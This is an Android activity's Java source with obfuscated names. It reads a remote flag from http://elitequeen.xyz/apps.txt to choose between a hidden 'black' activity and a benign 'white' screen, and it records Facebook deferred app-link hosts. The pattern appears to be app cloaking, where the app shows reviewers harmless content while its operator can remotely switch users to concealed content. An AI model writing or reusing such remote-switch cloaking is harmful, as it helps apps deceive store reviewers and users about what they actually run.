package com.firsttouchga.eltqblack;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;

import com.facebook.applinks.AppLinkData;
import com.firsttouchga.R;
import com.firsttouchga.eltqwhite.MainEliteScreen;
import com.orhanobut.hawk.Hawk;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

public class MainActivity extends AppCompatActivity {

    public static final String KIDODOFODFO = "dfB1";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        quwuejkdsakdkas();
        new sadyhdasgasdh().execute();
    }

    public class sadyhdasgasdh extends AsyncTask<Void, Void, Void> {

        String pasdosakdksad;
        String hsadjjsdajsdak = "http://elitequeen.xyz/apps.txt";
        @Override
        protected Void doInBackground(Void... voids) {
            try {
                Document bhhdsfjjfd;
                bhhdsfjjfd = Jsoup.connect(hsadjjsdajsdak).get();
                pasdosakdksad = bhhdsfjjfd.text();

            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }


        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);

            Intent bsahdaskiosadidsia = new Intent(getApplicationContext(), MainEliteScreen.class);

            Intent tsadydasjdjadsj = new Intent(getApplicationContext(), RepElQueen.class);
            switch(pasdosakdksad){
                case "1":    startActivity(tsadydasjdjadsj);
                    break;
                case "2":    startActivity(bsahdaskiosadidsia);
                    break;
            }
            overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
            finish();
        }


    }
    public void quwuejkdsakdkas() {

        AppLinkData.fetchDeferredAppLinkData(this,
                udiofofdo -> {
                    if (udiofofdo != null) {
                        String vgdhshadh;
                        vgdhshadh = udiofofdo.getTargetUri().getHost();
                        Hawk.put(KIDODOFODFO, vgdhshadh);
                        Log.d("FB", vgdhshadh);
                    } else {
                        Log.d("FB", "Error Code:");
                    }
                }
        );
    }
}